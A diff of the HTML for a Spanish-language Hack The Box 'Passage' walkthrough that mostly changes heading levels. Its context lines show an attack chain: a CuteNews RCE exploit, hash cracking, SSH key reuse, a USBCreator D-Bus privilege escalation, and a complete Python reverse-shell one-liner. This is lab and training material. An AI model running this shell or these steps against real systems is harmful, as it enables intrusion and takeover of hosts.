@@ -43,7 +43,7 @@
     &lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -74,7 +74,7 @@
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -138,11 +138,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Sep 25 01:34:55 2020 -- 1 IP address (1 host up) scanned in 10.77 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_020921.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Al intentar realizar una busqueda directorios y paginas con gobuster parecia que la maquina habia caido, pero segun un post de la pagina tienen implementado fail2ban, por lo que al utilizar herramientas como gobuster o hydra, fail2ban banea nuestra IP por algun tiempo.&lt;/p&gt;
-&lt;h2 id=&#34;cute-news-212---rce-&#34;&gt;CUTE NEWS 2.1.2 - RCE&lt;/h2&gt;
+&lt;h1 id=&#34;cute-news-212---rce&#34;&gt;CUTE NEWS 2.1.2 - RCE&lt;/h1&gt;
 &lt;p&gt;Explorando la pagina encontramos en el footer de esta el nombre de lo que parece ser un CMS, al investigar un poco acerca de este nombre encontramos un exploit &lt;a href=&#34;https://www.exploit-db.com/exploits/48800&#34;&gt;&lt;strong&gt;CuteNews 2.1.2 - Remote Code Execution&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_021143.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Segun el codigo del exploit realiza una consulta a &lt;code&gt;/CuteNews/cdata/users/lines&lt;/code&gt; donde se almacenan en &lt;code&gt;base64&lt;/code&gt; las credenciales de usuarios, verificamos que esta direccion exista en esta version de CMS y vemos la lista de usuarios codificados.&lt;/p&gt;
@@ -259,7 +259,7 @@ www-data
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.10.30&amp;#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;paul---user-&#34;&gt;PAUL - USER&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;paul---user&#34;&gt;PAUL - USER&lt;/h1&gt;
 &lt;p&gt;Una vez dentro con una shell más comoda realizamos una enumeracion en la maquina pero no encontramos nada más que solo los usuarios de la maquina: &lt;code&gt;paul&lt;/code&gt; y &lt;code&gt;nadav&lt;/code&gt;, pero recordemos, encontramos algunos hashes (SHA256), utilizamos &lt;code&gt;John&lt;/code&gt; y &lt;code&gt;rockyou.txt&lt;/code&gt; para obtener algunas contraseñas.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -284,7 +284,7 @@ f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_022407.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Una vez con las contraseñas intentamos cambiar de usuario con estas, logramos obtener una shell con el usuario &lt;code&gt;Paul&lt;/code&gt; y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_022737.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;nadav---user-&#34;&gt;NADAV - USER&lt;/h2&gt;
+&lt;h1 id=&#34;nadav---user&#34;&gt;NADAV - USER&lt;/h1&gt;
 &lt;p&gt;Realizamos una enumeracion con este usuario y esta vez encontramos en el archivo &lt;code&gt;authorized_keys&lt;/code&gt; la clave publica (id_rsa.pub) de &lt;code&gt;nadav&lt;/code&gt;, por lo que este usuario puede conectarse desde su cuenta a la nuestra (paul), si ese es el caso quizas nosotros tambien a la suya.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -302,7 +302,7 @@ paul@passage:~/.ssh$
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Nos conectamos mediante SSH en localhost con este usuario para comprobar que nuestro usuario (paul) tambien tenga acceso al usuario &lt;code&gt;nadav&lt;/code&gt;. Lo cual pudimos confirmar y ahora tenemos una shell con &lt;code&gt;nadav&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_023306.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Realizamos una enumeracion en la carpeta de &lt;code&gt;nadav&lt;/code&gt; y encontramos algo interesante en el archivo &lt;code&gt;.viminfo&lt;/code&gt; y es que uno de los archivos que fue editado con &lt;code&gt;vim&lt;/code&gt; es &lt;code&gt;/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf&lt;/code&gt;. Investigamos un poco acerca de este archivo y encontramos que es posible &lt;a href=&#34;https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/&#34;&gt;crear archivos como usuario &lt;code&gt;root&lt;/code&gt;&lt;/a&gt; utilizando &lt;code&gt;USBCreator D-Bus interface&lt;/code&gt; lo que podria ayudarnos a escalar privilegios. Para ello verificamos que &lt;code&gt;usb-creator-helper&lt;/code&gt; este siendo ejecutado con el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
